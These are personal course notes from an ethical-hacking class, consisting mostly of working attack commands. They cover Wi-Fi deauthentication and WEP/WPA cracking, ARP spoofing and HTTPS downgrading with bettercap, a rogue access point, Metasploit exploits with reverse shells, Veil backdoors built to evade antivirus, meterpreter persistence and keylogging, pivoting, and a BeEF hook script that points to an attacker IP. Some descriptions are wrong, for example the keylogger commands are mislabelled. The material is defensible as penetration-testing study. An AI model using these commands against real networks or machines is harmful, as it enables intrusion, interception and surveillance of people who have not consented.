---
title: "Learn_Ethical_Hacking_From_Scratch"
date: 2019-07-20T09:31:22+08:00
draft: true
---

## chapter 12
why change the mac address?
1. Increasr anonymity.
2. Impersonate other devices.
3. Bypass filters.

```sh
ifconfig wlan0 down
ifconfig wlan0 hw ether 00:11:22:33:44:55
ifconfig wlan0 up
```
hw:hardware
mac address will revert back to the original one when restart computer

AP : Access Point

## chapter 13

```sh
ifconfig wlan0 down
airmon-ng check kill
iwconfig wlan0 mode monitor
ifconfig wlan0 up
```

## chapter 14
```sh
airodump.ng mon0
```
```sh
service NetworkManager start

systemctl enable NetworkManager
```

## chapter 15
```sh
airodump-ng --band abg mon0
```

Most common WiFi Bands are:
   - a uses 5 Ghz frequency only.
   - b,g both use 2.4 Ghz frequency only.
   - n uses 2.4 and 5 Ghz.
   - ac users frequencies lower than 6 Ghz.

## chapter 16
capure everything
```sh
airodump-ng --bssid [some-mac-address] --channel 2 --write test mon0
```

## chapter 17 Deauthentication Attack

Disconnect any client from any network
   - Works on encrypted networks (WEP, WPA & WPA2).
   -  No need to know the network key.
   -  No need to connect to the network.

```sh
aireplay-ng --deauth [DeauthPackets] -a [NetworkMac] -c [TargetMac] [Interface]
```

## chapter 19

- WEP: Wired Equivalent Privacy
- Old encryption
- Uses an algorithm called RC4
- Still used in some networks
- Can be cracked easily

- IV is too small (only 24 bits)
- IV is sent in plain text

## chapter 20

To crack WEP we need to:
1. Capture a large number of packets/IVs.
   using airodump-ng
2. Analyse the captured IVs and crack the key.
   using aircrack-ng

```sh
aircrack-ng [cap_file_name]
```

## chapter 21

Problem:
- if network is not busy
- it would take some time to capture enough IVs

Solution:
- Force the AP to generate new IVs.

Problem:
- APs only communicate with connected clients.

Solution:
- Associate with the AP before launching the attack.

```sh
aireplay-ng --fakeauth 0 -a [NetworkMac] -h [monMac] mon0
```

## chapter 22

- Wait for an ARP packet.
- Capture it, and replay it(retransmit it).
- This causes the AP to produce another packet with a new IV.
- Keep doing this till we have enough IVs to crack the key.

```sh
aireplay-ng --arpreplay -b [NetworkMac] -h [monMac] mon0
aircrack-ng arpreplay-01.cap
```

## chapter 23

WPA / WPA2 Cracking

- Both can be cracked using the same methods.
- Made to address the issues in WEP.
- Much more secure.
- Each packet is encrypted using a unique temporary key.

Packets contain no useful infomation.

## chapter 24

```sh
wash --interface mon0

aireplay-ng --fakeauth 30 -a [NetworkMac] -h [monMac] mon0

reaver --bssid [NetworkMac] --channel 1 --interface mon0 -vvv --no-associate
```

## chapter 26

```sh
$ crunch [min] [max] [characters] -t [pattern] -o [FileName]
```

## chapter 27

Two things needed to crack WPA/WPA2:
- 4-way handshake.
- wordlist.
  
### use the default wordlist in kali
```sh
gzip -d /usr/share/wordlists/rockyou.txt.gz
```

```sh
aircrack-ng handshake_file -w wordlist_file
```

# Post-connection Attacks
## chapter 31

https://developer.microsoft.com/en-us/microsoft-edge/tools/vms/

Passw0rd!

## chapter 32
```sh
netdiscover -r 192.168.0.1/24
```

## chapter 34 
alpine

## chapter 35
Man In The Middel Attacks 
MITM

arpspoof
ARP SPOOFING

`ADDRESS RESOLUTION PROTOCOL (ARP)`
simple protocol used to map IP Address of a machine to its MAC address

```sh
arp -a      // list the arp table
```

Why ARP Spoofing is possible:
1. Clients accept responses even if they did not send a request.
2. Clients trust response without any form of veritication.

## chapter 36

```sh
arpspoof -i [interface] -t [clientIP] [gatewayIP]

arpspoof -i [interface] -t [gatewayIP] [clientIP]

echo 1 > /proc/sys/net/ipv4/ip_forward
```

## chapter 37

```sh
bettercap -iface [interface]
```

## chapter 38

```sh
bettercap -iface [interface]p
> help
> help net.probe
> net.show

> set arp.spoof.fullduplex true
> set arp.spoof.targets [targetIP]
> arp.spoof on
```

## chapter 39

```sh
# in bettercap
> net.sniff on
```
vulnweb.com

## chapter 40
write caplet
```sh
net.probe on
set arp.spoof.fullduplex true
set arp.spoof.targets 192.168.0.10
arp.spoof on
net.sniff on
```

```sh
bettercap -iface eth0 -caplet [capletFile]
```
## chapter 41
Encrypt HTTP using TLS(Transport Layer Security) or SSL(Secure Sockets Layer)

Downgrade HTTPS to HTTP

```sh
cd /usr/share/bettercap/caplets
# delete old hstshijack
# copy form the udemy
```

modify caplet
```sh
net.probe on
set arp.spoof.fullduplex true
set arp.spoof.targets 192.168.0.10
arp.spoof on
set net.sniff.local true
net.sniff on
```

```sh
> caplets.show    //show all the capltes with the bettercap
> hstshijack/hstshijack
```

ctrl + shift + del   to open chrome clear browsing data dialog

## chapter 43

HSTS
- `HTTP Strict Transport Security`(HTTP严格传输安全).
- Used by Facebook, Twitter and few other famous websites.

Problem:
- Modern browsers are hard-coded to only load a list of HSTS websites over https
  
Solution:
- Trick the browser into loading a different website.
Replace all links for HSTS websites with similar links

facebook.com -> facebook.corn
twitter.com -> twiter.com

SSL stripping

## chapter 44

```sh
service apache2 start
ifconfig

vim /var/www/html/index.html
```

```sh
> set dns.spoof.all true
> set dns.spoof.domains zsecurity.org,*.zsecurity.org
> dns.spoof on
```
not work for hsts

## chapter 45
Bettercap code injection

- inject javascript code in loaded pages
- code gets executed by the target browser
- this can be used to 
  - replace links
  - replace images
  - insert html elements
  - hook target browser to exploitation frameworks
  - +more!
  - 
```sh
vim /usr/share/bettercap/caplets/hstshijack/hstshijack.cap
# modifty the hstshijack.payloads line add the following
*:/root/alert.js
```
not work for hsts

## chapter 46
- wireshark is a network protocol analyser.
- designed to help network administrators to keep track of what is happening in their network

How does it work?
- logs packets that flow through the selected interface
- analyse all the packets

## chapter 49

```sh
# add the following line
set net.sniff.output /root/capturefile.cap
```

## chapter 50
fake access point
wireless adapter that supports ap mode

MANA-TOOLKIT
- tools run rogue access point attacks
- it can:
  - automatically configure and create fake ap
  - automatically sniff data
  - automatically bypass https
  - ...etc

Mana has 3 main start scripts:
1. start-noupstream.sh - start fake AP with no internet access.
2. start-nat-simple.sh - start fake AP with internet access. most usefull.
3. start-nat-full.sh -start fake AP with internet access, and automatically starts sniffing data, bypass https.

wlan0
- in manager mode
- not connected to network

```sh
apt-get install mana-toolkit

# to modify inferface and SSID
vim /etc/mana-toolkit/hostpad-mana.conf

# to modify upstream interface and phy
vim /usr/share/mana-toolkit/run-mana/start-nat-simple.sh
bash /usr/share/mana-toolkit/run-mana/start-nat-simple.sh 
```

## chapter 52

detect arp spoof

XArp

## chapter 53

ARP Address Resolution Protocol

## chapter 54

Server side

Client side

## chapter 55

metasploitable

name: msfadmin
pass: msfadmin

## chapter 57

- try default password(ssh iPad case).
- Services might be mis-configured, such as the "r" service. Ports 512, 513, 514
- some might even contain a back door
- code execution vulnerabilities

```sh
id
uname -a
```

## chapter 58
- > msfconsole - runs the metasploit console
- > help - shows help
- > show [something] - something can be exploits, payloads, auxiliaries or options
- > use [somethins] - use a certain exploit, payload or auxiliary.
- > set [option] [value] - configure [option] to have a value of [value]
- > exploit - runs the current task

back door case
```sh
# in kali
msfconsole
use exploit/unix/ftp/vsftpd_234_backdoor
show options
set RHOST [target_address]
show options
exploit     # may run more than one time
```

code execution vulnerabilities case
## chapter 59
```sh
msfconsole
use exploit/multi/samba/usermap_script
show options
set RHOST [target_address]
show options
show payloads
set PAYLOAD cmd/unix/reverse_netcat
set LHOST [my_own_address]
show options
set LPORT 5555    # just in case
show options
exploit
```

## chapter 60

NEXPOSE

```sh
service postgresql stop
chmod +x [installer file name]
./[installer file name]
```

## chapter 63

- use if server side attacks fail.
- if IP is probably useless.
- require user interaction.
- social engineering can be very useful.
- information gathing is vital.

## chapter 64

VEIL - framework

- a backdoor is a file that gives us full control over the machine that it gets executed on.
- backdoors can be caught by anti-virus programs.
- veil is a framework for generating undetectable backdoors.

```sh
cd /opt
git clone https://github.com/Veil-Framework/Veil.git
cd Veil
cd config
./setup.sh --silent --force

# after finished, start the program
cd /opt/Veil
./Veil.py
> list
> use 1
> list
> use 15
> set LHOST 10.0.2.4
> set LPORT 8080
> options
> generate
# set other options to make the programs unique to avoid be dected by Anti-virus software
```
https://nodistribute.com/ don't share the scan results.

## chapter 67

Listen for incoming connections
```sh
msfconsole
> use exploit/multi/handler         # selet a module
> show options
> set PAYLOAD windows/meterpreter/reverse_https
> set LHOST 10.0.2.4       # your ip address
> set LPORT 8080
> show options
> exploit
```

## chapter 68

creat a folder in /var/www/html
```
service apache2 start
```

## chapter 71

only download from https pages

## chapter 73

maltego

## chapter 78

backdoor any files

urls="pic_url, exe_url"

## chapter 79

compile script to .exe

## chapter 80

app: Characters -> Right-to-left-override

## chapter 83

Beef: Browser Exploitation Framework

- DNS spoof requests to a page containing the hook.
- Inject the hook in browsed pages (need to be MITM)
- Use XSS exploit
- Social engineer the target to open a hook page.

Usename: beef
Password: haha
```html
# modify the ip to your own ip
<script src="http://10.0.2.4:3000/hook.js"></script>
```

## chapter 88

Analysing trojans
- Check properties of the file.
- Is it what it seems to be?
- Run the file in a virtual machine and check resources.
- Use an online Sandbox service.
  <https://wwww.hybrid-analysis.com>

Reverse DNS

## chapter 92

```sh
route -n
```
Router IP forward:
- download backdoor, use portn 80
- reverse connecte, use port 8080
- beef connect, use port 3000

## chapter 95
Post exploitation
meterpreter basics
- >help -shows help.
- >background - backgorunds current session.
- >sessions -l - lists all sessions.
- >sessions -i [session id]- interact with a certain session.
- >sysinfo - displays system info.
- >ipconfig - displays info about interfaces.
- >getuid - shows current user.

```sh
migrate [id]
```

## chapter 96

- >pwd
- >ls
- >cd [location]
- >cat [file] - prints the content of [file] on screen.
- >download [file] - downloads [file].
- >upload [file] - uploads [file].
- >execute -f [file] - executes [file].

## chapter 97

persistence module of meterpreter

```meterpreter
run persistence -h
run persistence -U -i 20 -p 80 -r 10.0.2.4
```

1. Using a veil-evasion
   - Does not always work
2. Using persistence module
   - Detectable by antivirus programs
3. Using metasploit + veil-evasion -> More robust + undetectable by Antivirus
   - > use exploit/windows/local/persistence
   - > set session [session id]
   - > set exe:custom [backdoor location]
   - > exploit

## chapter 98
```sh
show advanced
sessions -K       # kill session
```

## chapter 99

Key logging
log all mouse/keyboard events

- > keyscan_start - shows current working directory
- > keyscan_dump - lists files in the current working directory
- > keyscan_stop - changes working directory to [location]
- > screenshot - take a screenshot of the target computer

## chapter 100

pivoting

- use the hacked device as a pivot.
- try to gain access to other devices in the network.

## chapter 101

Pivoting using autoroute

1. Use it 
   > use post/windows/manage/autoroute
2. Set subnet of target network
   > set subnet [subnet]
3. Set session id
   > set session [id]
4. exploit
   > exploit

```msf
use exploit/multi/samba/usermap_script
set RHOST 10.20.15.4       # set the ip of meterploitable
show payloads
set PAYLOAD cmd/unix/bind_netcat
show options
exploit
```

```msf
use post/windows/manage/autoroute
show options
set SESSION 1
set SUBNET 10.20.15.0
exploit
```

## chapter 102

web server sied: PHP, Python
client side: JS

## chapter 103

web application pentesting
server side attacks
client side attacks

DVWA
username: admin
password: password

set security to low

## chapter 104

- IP address
- Domain name info
- Technologies used
- Other websites on the same server
- DNS records
- Unlisted files, sub-domains, directories

1. Whois Lookup - Find info about the owner of the target.
   <http://whois.domaintools.com/>
2. Netcraft Site Report - Shows technologies used on the target.
   <http://toolbar.netcraft.com/site_report?url=>
3. Rebtex DNS lookup - Shows comprehensive info about the target website.
   <https://www.robtex.com/>